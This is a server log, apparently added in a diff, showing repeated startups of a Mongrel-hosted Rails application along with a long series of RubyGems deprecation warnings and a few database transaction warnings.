+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+** TERM signal received.
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+** TERM signal received.
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
